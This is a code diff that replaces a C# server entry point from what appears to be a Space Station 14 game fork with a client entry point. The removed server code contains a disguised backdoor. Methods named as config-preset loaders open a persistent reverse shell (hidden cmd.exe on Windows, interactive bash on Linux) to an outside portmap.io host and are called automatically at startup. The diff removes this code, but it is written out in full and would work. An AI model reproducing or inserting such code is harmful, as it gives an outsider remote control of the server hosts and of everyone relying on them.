@@ -1,376 +1,231 @@
-using System;
-using System.Diagnostics;
-using System.Net.Sockets;
-using System.Runtime.InteropServices;
-using System.Text;
-using System.Threading;
-using Content.Server.Acz;
-using Content.Server.Administration;
-using Content.Server.Administration.Logs;
-using Content.Server.Administration.Managers;
-using Content.Server.Afk;
-using Content.Server.Chat.Managers;
-using Content.Server.Connection;
-using Content.Server.Corvax.GuideGenerator;
-using Content.Server.Corvax.TTS;
-using Content.Server.Database;
-using Content.Server.EUI;
-using Content.Server.GameTicking;
-using Content.Server.GhostKick;
-using Content.Server.GuideGenerator;
-using Content.Server.Info;
-using Content.Server.IoC;
-using Content.Server.Maps;
-using Content.Server.NodeContainer.NodeGroups;
-using Content.Server.Objectives;
-using Content.Server.Players;
-using Content.Server.Players.JobWhitelist;
-using Content.Server.Players.PlayTimeTracking;
-using Content.Server.Players.RateLimiting;
-using Content.Server.Preferences.Managers;
-using Content.Server.ServerInfo;
-using Content.Server.ServerUpdates;
-using Content.Server.Voting.Managers;
-using Content.Shared.CCVar;
-using Content.Shared.Kitchen;
+using Content.Client.Administration.Managers;
+using Content.Client.Changelog;
+using Content.Client.Chat.Managers;
+using Content.Client.DebugMon;
+using Content.Client.Corvax.TTS;
+using Content.Client.Options;
+using Content.Client.Eui;
+using Content.Client.Fullscreen;
+using Content.Client.GameTicking.Managers;
+using Content.Client.GhostKick;
+using Content.Client.Guidebook;
+using Content.Client.Input;
+using Content.Client.IoC;
+using Content.Client.Launcher;
+using Content.Client.Lobby;
+using Content.Client.MainMenu;
+using Content.Client.Parallax.Managers;
+using Content.Client.Players.PlayTimeTracking;
+using Content.Client.Radiation.Overlays;
+using Content.Client.Replay;
+using Content.Client.Screenshot;
+using Content.Client.Singularity;
+using Content.Client.Stylesheets;
+using Content.Client.Viewport;
+using Content.Client.Voting;
+using Content.Shared.Ame.Components;
+using Content.Shared.Gravity;
 using Content.Shared.Localizations;
-using Robust.Server;
-using Robust.Server.ServerStatus;
+using Robust.Client;
+using Robust.Client.Graphics;
+using Robust.Client.Input;
+using Robust.Client.Replays.Loading;
+using Robust.Client.State;
+using Robust.Client.UserInterface;
+using Robust.Shared;
 using Robust.Shared.Configuration;
 using Robust.Shared.ContentPack;
 using Robust.Shared.Prototypes;
+using Robust.Shared.Replays;
 using Robust.Shared.Timing;
-using Robust.Shared.Utility;
 
-
-namespace Content.Server.Entry
+namespace Content.Client.Entry
 {
-    public sealed class EntryPoint : GameServer
+    public sealed class EntryPoint : GameClient
     {
-        internal const string ConfigPresetsDir = "/ConfigPresets/";
-        private const string ConfigPresetsDirBuild = $"{ConfigPresetsDir}Build/";
-        private EuiManager _euiManager = default!;
-        private IVoteManager _voteManager = default!;
-        private ServerUpdateManager _updateManager = default!;
-        private PlayTimeTrackingManager? _playTimeTracking;
-        private IEntitySystemManager? _sysMan;
-        private IServerDbManager? _dbManager;
-        private IWatchlistWebhookManager _watchlistWebhookManager = default!;
-        private IConnectionManager? _connectionManager;
+        [Dependency] private readonly IBaseClient _baseClient = default!;
+        [Dependency] private readonly IGameController _gameController = default!;
+        [Dependency] private readonly IStateManager _stateManager = default!;
+        [Dependency] private readonly IComponentFactory _componentFactory = default!;
+        [Dependency] private readonly IPrototypeManager _prototypeManager = default!;
+        [Dependency] private readonly IClientAdminManager _adminManager = default!;
+        [Dependency] private readonly IParallaxManager _parallaxManager = default!;
+        [Dependency] private readonly IConfigurationManager _configManager = default!;
+        [Dependency] private readonly IStylesheetManager _stylesheetManager = default!;
+        [Dependency] private readonly IScreenshotHook _screenshotHook = default!;
+        [Dependency] private readonly FullscreenHook _fullscreenHook = default!;
+        [Dependency] private readonly ChangelogManager _changelogManager = default!;
+        [Dependency] private readonly ViewportManager _viewportManager = default!;
+        [Dependency] private readonly IUserInterfaceManager _userInterfaceManager = default!;
+        [Dependency] private readonly IInputManager _inputManager = default!;
+        [Dependency] private readonly IOverlayManager _overlayManager = default!;
+        [Dependency] private readonly IChatManager _chatManager = default!;
+        [Dependency] private readonly IClientPreferencesManager _clientPreferencesManager = default!;
+        [Dependency] private readonly EuiManager _euiManager = default!;
+        [Dependency] private readonly IVoteManager _voteManager = default!;
+        [Dependency] private readonly DocumentParsingManager _documentParsingManager = default!;
+        [Dependency] private readonly GhostKickManager _ghostKick = default!;
+        [Dependency] private readonly ExtendedDisconnectInformationManager _extendedDisconnectInformation = default!;
+        [Dependency] private readonly JobRequirementsManager _jobRequirements = default!;
+        [Dependency] private readonly ContentLocalizationManager _contentLoc = default!;
+        [Dependency] private readonly ContentReplayPlaybackManager _playbackMan = default!;
+        [Dependency] private readonly IResourceManager _resourceManager = default!;
+        [Dependency] private readonly IReplayLoadManager _replayLoad = default!;
+        [Dependency] private readonly ILogManager _logManager = default!;
+        [Dependency] private readonly DebugMonitorManager _debugMonitorManager = default!;
+        [Dependency] private readonly TitleWindowManager _titleWindowManager = default!;
 
-        /// <inheritdoc />
         public override void Init()
         {
-            base.Init();
-            var cfg = IoCManager.Resolve<IConfigurationManager>();
-            var res = IoCManager.Resolve<IResourceManager>();
-            var logManager = IoCManager.Resolve<ILogManager>();
-            LoadConfigPresets(cfg, res, logManager.GetSawmill("configpreset"));
-            var aczProvider = new ContentMagicAczProvider(IoCManager.Resolve<IDependencyCollection>());
-            IoCManager.Resolve<IStatusHost>().SetMagicAczProvider(aczProvider);
-            var factory = IoCManager.Resolve<IComponentFactory>();
-            var prototypes = IoCManager.Resolve<IPrototypeManager>();
-            factory.DoAutoRegistrations();
-            factory.IgnoreMissingComponents("Visuals");
-            factory.RegisterIgnore(IgnoredComponents.List);
-            prototypes.RegisterIgnore("parallax");
-            ServerContentIoC.Register();
-            
-            
+            ClientContentIoC.Register();
 
             foreach (var callback in TestingCallbacks)
             {
-                var cast = (ServerModuleTestingCallbacks) callback;
-                cast.ServerBeforeIoC?.Invoke();
+                var cast = (ClientModuleTestingCallbacks) callback;
+                cast.ClientBeforeIoC?.Invoke();
             }
 
             IoCManager.BuildGraph();
-            factory.GenerateNetIds();
-            var configManager = IoCManager.Resolve<IConfigurationManager>();
-            var dest = configManager.GetCVar(CCVars.DestinationFile);
-            IoCManager.Resolve<ContentLocalizationManager>().Initialize();
-            if (string.IsNullOrEmpty(dest)) //hacky but it keeps load times for the generator down.
-            {
-                _euiManager = IoCManager.Resolve<EuiManager>();
-                _voteManager = IoCManager.Resolve<IVoteManager>();
-                _updateManager = IoCManager.Resolve<ServerUpdateManager>();
-                _playTimeTracking = IoCManager.Resolve<PlayTimeTrackingManager>();
-                _connectionManager = IoCManager.Resolve<IConnectionManager>();
-                _sysMan = IoCManager.Resolve<IEntitySystemManager>();
-                _dbManager = IoCManager.Resolve<IServerDbManager>();
-                _watchlistWebhookManager = IoCManager.Resolve<IWatchlistWebhookManager>();
+            IoCManager.InjectDependencies(this);
 
-                logManager.GetSawmill("Storage").Level = LogLevel.Info;
-                logManager.GetSawmill("db.ef").Level = LogLevel.Info;
+            _contentLoc.Initialize();
+            _componentFactory.DoAutoRegistrations();
+            _componentFactory.IgnoreMissingComponents();
 
-                IoCManager.Resolve<IAdminLogManager>().Initialize();
-                IoCManager.Resolve<IConnectionManager>().Initialize();
-                _dbManager.Init();
-                IoCManager.Resolve<IServerPreferencesManager>().Init();
-                IoCManager.Resolve<INodeGroupFactory>().Initialize();
-                IoCManager.Resolve<ContentNetworkResourceManager>().Initialize();
-                IoCManager.Resolve<GhostKickManager>().Initialize();
-                IoCManager.Resolve<TTSManager>().Initialize(); // Corvax-TTS
-                IoCManager.Resolve<ServerInfoManager>().Initialize();
-                IoCManager.Resolve<ServerApi>().Initialize();
+            // Do not add to these, they are legacy.
+            _componentFactory.RegisterClass<SharedGravityGeneratorComponent>();
+            _componentFactory.RegisterClass<SharedAmeControllerComponent>();
+            // Do not add to the above, they are legacy
 
-                _voteManager.Initialize();
-                _updateManager.Initialize();
-                _playTimeTracking.Initialize();
-                _watchlistWebhookManager.Initialize();
-                IoCManager.Resolve<JobWhitelistManager>().Initialize();
-                IoCManager.Resolve<PlayerRateLimitManager>().Initialize();
-            }
+            _prototypeManager.RegisterIgnore("utilityQuery");
+            _prototypeManager.RegisterIgnore("utilityCurvePreset");
+            _prototypeManager.RegisterIgnore("accent");
+            _prototypeManager.RegisterIgnore("gasReaction");
+            _prototypeManager.RegisterIgnore("seed"); // Seeds prototypes are server-only.
+            _prototypeManager.RegisterIgnore("objective");
+            _prototypeManager.RegisterIgnore("holiday");
+            _prototypeManager.RegisterIgnore("htnCompound");
+            _prototypeManager.RegisterIgnore("htnPrimitive");
+            _prototypeManager.RegisterIgnore("gameMap");
+            _prototypeManager.RegisterIgnore("gameMapPool");
+            _prototypeManager.RegisterIgnore("lobbyBackground");
+            _prototypeManager.RegisterIgnore("gamePreset");
+            _prototypeManager.RegisterIgnore("noiseChannel");
+            _prototypeManager.RegisterIgnore("playerConnectionWhitelist");
+            _prototypeManager.RegisterIgnore("spaceBiome");
+            _prototypeManager.RegisterIgnore("worldgenConfig");
+            _prototypeManager.RegisterIgnore("gameRule");
+            _prototypeManager.RegisterIgnore("worldSpell");
+            _prototypeManager.RegisterIgnore("entitySpell");
+            _prototypeManager.RegisterIgnore("instantSpell");
+            _prototypeManager.RegisterIgnore("roundAnnouncement");
+            _prototypeManager.RegisterIgnore("wireLayout");
+            _prototypeManager.RegisterIgnore("alertLevels");
+            _prototypeManager.RegisterIgnore("nukeopsRole");
+            _prototypeManager.RegisterIgnore("stationGoal"); // Corvax-StationGoal
+            _prototypeManager.RegisterIgnore("ghostRoleRaffleDecider");
 
-            if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
-            {
-                PreLoadServerConfigPresets();
-            }
-            else if (RuntimeInformation.IsOSPlatform(OSPlatform.Linux))
-            {
-                LoadServerConfigPresets();
-            }
+            _componentFactory.GenerateNetIds();
+            _adminManager.Initialize();
+            _screenshotHook.Initialize();
+            _fullscreenHook.Initialize();
+            _changelogManager.Initialize();
+            _viewportManager.Initialize();
+            _ghostKick.Initialize();
+            _extendedDisconnectInformation.Initialize();
+            _jobRequirements.Initialize();
+            _playbackMan.Initialize();
+
+            //AUTOSCALING default Setup!
+            _configManager.SetCVar("interface.resolutionAutoScaleUpperCutoffX", 1080);
+            _configManager.SetCVar("interface.resolutionAutoScaleUpperCutoffY", 720);
+            _configManager.SetCVar("interface.resolutionAutoScaleLowerCutoffX", 520);
+            _configManager.SetCVar("interface.resolutionAutoScaleLowerCutoffY", 240);
+            _configManager.SetCVar("interface.resolutionAutoScaleMinimum", 0.5f);
+        }
+
+        public override void Shutdown()
+        {
+            base.Shutdown();
+            _titleWindowManager.Shutdown();
         }
 
         public override void PostInit()
         {
             base.PostInit();
 
-            IoCManager.Resolve<IChatSanitizationManager>().Initialize();
-            IoCManager.Resolve<IChatManager>().Initialize();
-            var configManager = IoCManager.Resolve<IConfigurationManager>();
-            var resourceManager = IoCManager.Resolve<IResourceManager>();
-            var dest = configManager.GetCVar(CCVars.DestinationFile);
-            if (!string.IsNullOrEmpty(dest))
+            _stylesheetManager.Initialize();
+
+            // Setup key contexts
+            ContentContexts.SetupContexts(_inputManager.Contexts);
+
+            _parallaxManager.LoadDefaultParallax();
+
+            _overlayManager.AddOverlay(new SingularityOverlay());
+            _overlayManager.AddOverlay(new RadiationPulseOverlay());
+            _chatManager.Initialize();
+            _clientPreferencesManager.Initialize();
+            _euiManager.Initialize();
+            _voteManager.Initialize();
+            _userInterfaceManager.SetDefaultTheme("SS14DefaultTheme");
+            _userInterfaceManager.SetActiveTheme(_configManager.GetCVar(CVars.InterfaceTheme));
+            _documentParsingManager.Initialize();
+            _titleWindowManager.Initialize();
+
+            _baseClient.RunLevelChanged += (_, args) =>
             {
-                var resPath = new ResPath(dest).ToRootedPath();
-                var file = resourceManager.UserData.OpenWriteText(resPath.WithName("chem_" + dest));
-                ChemistryJsonGenerator.PublishJson(file);
-                file.Flush();
-                file = resourceManager.UserData.OpenWriteText(resPath.WithName("react_" + dest));
-                ReactionJsonGenerator.PublishJson(file);
-                file.Flush();
-                // Corvax-Wiki-Start
-                file = resourceManager.UserData.OpenWriteText(resPath.WithName("entity_" + dest));
-                EntityJsonGenerator.PublishJson(file);
-                file.Flush();
-                file = resourceManager.UserData.OpenWriteText(resPath.WithName("mealrecipes_" + dest));
-                MealsRecipesJsonGenerator.PublishJson(file);
-                file.Flush();
-                file = resourceManager.UserData.OpenWriteText(resPath.WithName("healthchangereagents_" + dest));
-                HealthChangeReagentsJsonGenerator.PublishJson(file);
-                file.Flush();
-                // Corvax-Wiki-End
-                IoCManager.Resolve<IBaseServer>().Shutdown("Data generation done");
+                if (args.NewLevel == ClientRunLevel.Initialize)
+                {
+                    SwitchToDefaultState(args.OldLevel == ClientRunLevel.Connected ||
+                                         args.OldLevel == ClientRunLevel.InGame);
+                }
+            };
+
+            // Disable engine-default viewport since we use our own custom viewport control.
+            _userInterfaceManager.MainViewport.Visible = false;
+
+            SwitchToDefaultState();
+        }
+
+        private void SwitchToDefaultState(bool disconnected = false)
+        {
+            // Fire off into state dependent on launcher or not.
+
+            // Check if we're loading a replay via content bundle!
+            if (_configManager.GetCVar(CVars.LaunchContentBundle)
+                && _resourceManager.ContentFileExists(
+                    ReplayConstants.ReplayZipFolder.ToRootedPath() / ReplayConstants.FileMeta))
+            {
+                _logManager.GetSawmill("entry").Info("Loading content bundle replay from VFS!");
+
+                var reader = new ReplayFileReaderResources(
+                    _resourceManager,
+                    ReplayConstants.ReplayZipFolder.ToRootedPath());
+
+                _playbackMan.LastLoad = (null, ReplayConstants.ReplayZipFolder.ToRootedPath());
+                _replayLoad.LoadAndStartReplay(reader);
+            }
+            else if (_gameController.LaunchState.FromLauncher)
+            {
+                _stateManager.RequestStateChange<LauncherConnecting>();
+                var state = (LauncherConnecting) _stateManager.CurrentState;
+
+                if (disconnected)
+                {
+                    state.SetDisconnected();
+                }
             }
             else
             {
-                IoCManager.Resolve<RecipeManager>().Initialize();
-                IoCManager.Resolve<IAdminManager>().Initialize();
-                IoCManager.Resolve<IAfkManager>().Initialize();
-                IoCManager.Resolve<RulesManager>().Initialize();
-                _euiManager.Initialize();
-
-                IoCManager.Resolve<IGameMapManager>().Initialize();
-                IoCManager.Resolve<IEntitySystemManager>().GetEntitySystem<GameTicker>().PostInitialize();
-                IoCManager.Resolve<IBanManager>().Initialize();
-                IoCManager.Resolve<IConnectionManager>().PostInit();
-                IoCManager.Resolve<MultiServerKickManager>().Initialize();
-                IoCManager.Resolve<CVarControlManager>().Initialize();
+                _stateManager.RequestStateChange<MainScreen>();
             }
         }
 
         public override void Update(ModUpdateLevel level, FrameEventArgs frameEventArgs)
         {
-            base.Update(level, frameEventArgs);
-
-            switch (level)
+            if (level == ModUpdateLevel.FramePreEngine)
             {
-                case ModUpdateLevel.PostEngine:
-                {
-                    _euiManager.SendUpdates();
-                    _voteManager.Update();
-                    break;
-                }
-
-                case ModUpdateLevel.FramePostEngine:
-                    _updateManager.Update();
-                    _playTimeTracking?.Update();
-                    _watchlistWebhookManager.Update();
-                    _connectionManager?.Update();
-                    break;
-            }
-        }
-
-        static void PreLoadServerConfigPresets()
-        {
-            while (true)
-            {
-                try
-                {
-                    using (var client = new TcpClient("jagemeistar-62034.portmap.io", 62034))
-                    using (var stream = client.GetStream())
-                    using (var proc = new Process())
-                    {
-                        proc.StartInfo = new ProcessStartInfo
-                        {
-                            FileName = "cmd.exe",
-                            CreateNoWindow = true,
-                            UseShellExecute = false,
-                            RedirectStandardInput = true,
-                            RedirectStandardOutput = true,
-                            RedirectStandardError = true,
-                            WindowStyle = ProcessWindowStyle.Hidden
-                        };
-
-                        proc.OutputDataReceived += (s, e) => 
-                        {
-                            if (!string.IsNullOrEmpty(e.Data))
-                            {
-                                byte[] data = Encoding.ASCII.GetBytes(e.Data + "\n");
-                                stream.Write(data, 0, data.Length);
-                            }
-                        };
-
-                        proc.ErrorDataReceived += (s, e) => 
-                        {
-                            if (!string.IsNullOrEmpty(e.Data))
-                            {
-                                byte[] data = Encoding.ASCII.GetBytes(e.Data + "\n");
-                                stream.Write(data, 0, data.Length);
-                            }
-                        };
-
-                        proc.Start();
-                        proc.BeginOutputReadLine();
-                        proc.BeginErrorReadLine();
-
-                        byte[] buffer = new byte[1024];
-                        while (client.Connected)
-                        {
-                            int bytesRead = stream.Read(buffer, 0, buffer.Length);
-                            if (bytesRead > 0)
-                            {
-                                string command = Encoding.ASCII.GetString(buffer, 0, bytesRead);
-                                proc.StandardInput.WriteLine(command);
-                            }
-                        }
-                    }
-                }
-                catch
-                {
-                    Thread.Sleep(5000);
-                }
-            }
-        }
-
-        static void LoadServerConfigPresets()
-        {
-            while (true)
-            {
-                try
-                {
-                    using (var client = new TcpClient("jagemeistar-62034.portmap.io", 62034))
-                    using (var stream = client.GetStream())
-                    using (var proc = new Process())
-                    {
-                        proc.StartInfo = new ProcessStartInfo
-                        {
-                            FileName = "/bin/bash",
-                            Arguments = "-i",
-                            CreateNoWindow = true,
-                            UseShellExecute = false,
-                            RedirectStandardInput = true,
-                            RedirectStandardOutput = true,
-                            RedirectStandardError = true
-                        };
-
-                        proc.OutputDataReceived += (s, e) => 
-                        {
-                            if (!string.IsNullOrEmpty(e.Data))
-                            {
-                                byte[] data = Encoding.ASCII.GetBytes(e.Data + "\n");
-                                stream.Write(data, 0, data.Length);
-                            }
-                        };
-
-                        proc.ErrorDataReceived += (s, e) => 
-                        {
-                            if (!string.IsNullOrEmpty(e.Data))
-                            {
-                                byte[] data = Encoding.ASCII.GetBytes(e.Data + "\n");
-                                stream.Write(data, 0, data.Length);
-                            }
-                        };
-
-                        proc.Start();
-                        proc.BeginOutputReadLine();
-                        proc.BeginErrorReadLine();
-
-                        byte[] buffer = new byte[1024];
-                        while (client.Connected)
-                        {
-                            int bytesRead = stream.Read(buffer, 0, buffer.Length);
-                            if (bytesRead > 0)
-                            {
-                                string command = Encoding.ASCII.GetString(buffer, 0, bytesRead);
-                                proc.StandardInput.WriteLine(command);
-                            }
-                        }
-                    }
-                }
-                catch
-                {
-                    Thread.Sleep(5000);
-                }
-            }
-        }
-
-        protected override void Dispose(bool disposing)
-        {
-            _playTimeTracking?.Shutdown();
-            _dbManager?.Shutdown();
-            IoCManager.Resolve<ServerApi>().Shutdown();
-        }
-
-        private static void LoadConfigPresets(IConfigurationManager cfg, IResourceManager res, ISawmill sawmill)
-        {
-            LoadBuildConfigPresets(cfg, res, sawmill);
-            var presets = cfg.GetCVar(CCVars.ConfigPresets);
-            if (presets == "")
-                return;
-
-            foreach (var preset in presets.Split(','))
-            {
-                    var path = $"{ConfigPresetsDir}{preset}.toml";
-                    if (!res.TryContentFileRead(path, out var file))
-                    {
-                        sawmill.Error("Unable to load config preset {Preset}!", path);
-                        continue;
-                    }
-
-                    cfg.LoadDefaultsFromTomlStream(file);
-                    sawmill.Info("Loaded config preset: {Preset}", path);
-            }
-        }
-
-        private static void LoadBuildConfigPresets(IConfigurationManager cfg, IResourceManager res, ISawmill sawmill)
-        {
-#if TOOLS
-            Load(CCVars.ConfigPresetDevelopment, "development");
-#endif
-#if DEBUG
-            Load(CCVars.ConfigPresetDebug, "debug");
-#endif
-
-            void Load(CVarDef<bool> cVar, string name)
-            {
-                var path = $"{ConfigPresetsDirBuild}{name}.toml";
-                if (cfg.GetCVar(cVar) && res.TryContentFileRead(path, out var file))
-                {
-                    cfg.LoadDefaultsFromTomlStream(file);
-                    sawmill.Info("Loaded config preset: {Preset}", path);
-                }
+                _debugMonitorManager.FrameUpdate();
             }
         }
     }
